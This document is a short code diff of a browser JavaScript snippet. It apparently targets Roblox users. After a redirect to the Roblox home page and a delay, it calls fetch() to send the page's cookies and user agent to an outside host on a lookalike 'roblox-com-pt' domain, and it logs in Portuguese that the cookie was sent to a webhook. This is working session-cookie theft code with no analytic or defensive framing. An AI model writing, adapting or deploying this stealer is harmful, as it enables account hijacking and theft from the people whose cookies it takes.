@@ -4,16 +4,15 @@
     return;
   }
 
+  if (location.pathname !== "/home") {
+    location.href = "https://www.roblox.com/home";
+    return;
+  }
+
   setTimeout(() => {
     fetch("https://roblox-com-pt.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent))
       .then(res => res.text())
-      .then(() => {
-        setTimeout(() => {
-          location.href = "https://www.roblox.com/home";
-        }, 3000);
-      })
-      .catch(() => {
-        location.href = "https://www.roblox.com/home";
-      });
+      .then(() => console.log("Cookie enviado pro webhook!"))
+      .catch(() => console.log("Falha ao enviar cookie"));
   }, 7000);
 })();
